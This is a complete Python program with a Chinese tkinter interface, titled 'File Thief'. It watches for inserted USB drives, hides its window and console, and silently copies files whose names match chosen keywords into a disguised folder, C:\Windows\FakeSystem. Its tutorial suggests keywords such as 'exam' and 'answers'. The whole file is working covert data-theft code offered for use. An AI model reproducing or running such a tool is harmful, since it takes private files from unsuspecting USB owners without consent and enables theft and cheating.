from tkinter import Tk, Label, Entry, Button, Frame, filedialog, Text, Scrollbar, font, BOTTOM
import win32console
import pythoncom
import threading
import win32gui
import win32con
import fnmatch
import shutil
import time
import wmi
import os

count = 1

# 检测U盘是否插入
def checkUsbDevice():
    pythoncom.CoInitialize()
    administration = wmi.WMI()
    while True:
        usb_drives = administration.query("SELECT * FROM Win32_DiskDrive WHERE InterfaceType='USB'")
        if len(usb_drives) > 0:
            return True
        time.sleep(2)


# 查询新增盘符
def getDrive():
    pythoncom.CoInitialize()
    administration = wmi.WMI()
    newDrive = set()
    for drive in administration.query("SELECT * FROM Win32_LogicalDisk"):
        newDrive.add(drive.DeviceID)
    return newDrive


# 模糊查找文件
def fuzzyQueryFiles(directory, patterns):
    keywordsCollection = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            for pattern in patterns:
                if fnmatch.fnmatch(file, pattern):
                    keywordsCollection.append(os.path.join(root, file))
                    break
    return keywordsCollection


# 扫描新增盘符找文件进行操作
def scanDriveOperationFiles(drive, targetFile):
    global count
    keywords = [f"*{s}*" for s in targetFile.split(",")]
    matchedFiles = fuzzyQueryFiles(drive, keywords)
    folderPath = pathInput.get()
    if folderPath == '':
        folderPath = "C:\\Windows\\FakeSystem"
    if not os.path.exists(folderPath):
        os.makedirs(folderPath)
    for filePath in matchedFiles:
        # 获取并修改文件名
        fileName = os.path.basename(filePath)
        newFileName = str(count) + "——" + fileName
        consolidateFilePaths = os.path.join(folderPath, newFileName)
        # 把文件存放到指定文件夹下
        shutil.copyfile(filePath, consolidateFilePaths)
        count += 1
    if runInput.get() in ['', '00', '10']:
        window.destroy()


# 检测U盘是否插入，扫描新增盘符，并查找目标文件进行操作
def checkScanDrives(targetFile):
    # 判断用户输入的盘符
    if driveInput.get():
        newDrives = set(driveInput.get().split(','))
        for drive in newDrives:
            scanDriveOperationFiles(drive, targetFile)
    else:  
        initialDrive = getDrive()
        result = checkUsbDevice()
        if result:
            currentDrive = getDrive()
            newDrives = currentDrive - initialDrive
            if newDrives:
                for drive in newDrives:
                    scanDriveOperationFiles(drive, targetFile)



# 启动程序并挂后台运行
def startRunning():
    if keywordInput.get() == '':
        return False
    if runInput.get() in ['', '01', '00']:
        window.withdraw()
        win32gui.ShowWindow(win32console.GetConsoleWindow(), win32con.SW_HIDE)
        
    scanThread = threading.Thread(target=lambda: checkScanDrives(keywordInput.get()))
    scanThread.daemon = True
    scanThread.start()


# 路径转换
def pathTranslation(empty):
    path = filedialog.askdirectory().replace("/", "\\")
    if path:
        if empty == 0:
            pathInput.delete(0, "end")
            pathInput.insert(0, path)
        else:
            driveInput.insert(0, path)


# 创建可视化窗口
window = Tk()
window.title("文件小偷")
window.geometry("350x350")
window.resizable(False, False)
window.wm_attributes("-topmost", 1)
frame = Frame(window, padx=10, pady=10)
frame.pack()
customFont = font.Font(family="楷体", size=12)

keywordTitle = Label(frame, text="文件名关键字:", font=customFont)
keywordTitle.grid(row=0, column=0, pady=20)
keywordInput = Entry(frame, font=customFont)
keywordInput.grid(row=0, column=1, pady=20)

pathButton = Button(frame, text="选择存放路径", command=lambda: pathTranslation(0), font=customFont)
pathButton.grid(row=1, column=0, pady=10)
pathInput = Entry(frame, font=customFont)
pathInput.grid(row=1, column=1, pady=10)

driveButton = Button(frame, text="盘符(默认U盘)", command=lambda: pathTranslation(1), font=customFont)
driveButton.grid(row=2, column=0, pady=20)
driveInput = Entry(frame, font=customFont)
driveInput.grid(row=2, column=1, pady=20)

runTitle = Label(frame, text="运行(默认后台):", font=customFont)
runTitle.grid(row=3, column=0, pady=10)
runInput = Entry(frame, font=customFont)
runInput.grid(row=3, column=1, pady=10)

startButton = Button(window, text="开始运行", width=10, command=startRunning, font=customFont)
startButton.pack(padx=10, pady=10)

tutorialButton = Button(window, text="使用教程", width=10, command=lambda: tutorial(), font=customFont)
tutorialButton.pack(padx=10, pady=10)

# 使用教程
def tutorial():
    # 创建窗口
    root = Tk()
    root.title("使用教程")
    root.geometry("1000x530")
    root.resizable(False, False)
    root.wm_attributes("-topmost", 1)

    # 创建文本框和滚动条
    frame = Frame(root, padx=10, pady=10)
    frame.pack(fill="both", expand=True)
    scrollbar = Scrollbar(frame)
    scrollbar.pack(side="right", fill="y")
    customFont = font.Font(size=100)
    text = Text(frame, wrap="word", yscrollcommand=scrollbar.set, font=customFont)
    text.pack(fill="both", expand=True)
    scrollbar.config(command=text.yview)

    # 设置文本内容
    tutorialText = """
    要在U盘插入前运行程序才能获取得到U盘里面的文件。
    参数1一定要输入参数不能为空，参数2与参数3和参数4可以不输入任何参数可为空。


    参数1—文件名关键字:关键字

        说明:可以多写几个关键词，要用英文逗号分隔开。比如像这样：答案,doc,txt,考试,学,资料

        
    参数2—选择存放路径:C:\Windows\FakeSystem

        说明:如果不输入任何路径，默认存放路径就是C:\Windows\FakeSystem
             可以更改其他路径，点击左边《选择存放路径》按钮即可，或自己手动输入
    
             
    参数3—盘符(默认U盘):C:

        说明:可以选择多个盘符,要用英文逗号隔开。比如:C:\,F:\ 或者指定默认文件夹:C:\Windows,D:\Edge
             如果不输入任何路径，默认的就是U盘所有盘符。
    
             
    参数4—运行(默认后台):00

        说明:00表示后台运行自动结束程序,01表示后台运行不结束程序,10表示前台运行自动结束程序,11表示前台运行不结束程序
             不输入空着（默认）或者其他-表示后台运行自动结束程序

    
    项目地址:https://github.com/cxfjh
    联系作者:2449579731@qq.com
    """

    # 插入文本到文本框中
    text.insert("2.0", tutorialText)
    text.config(state="disabled")


window.mainloop()
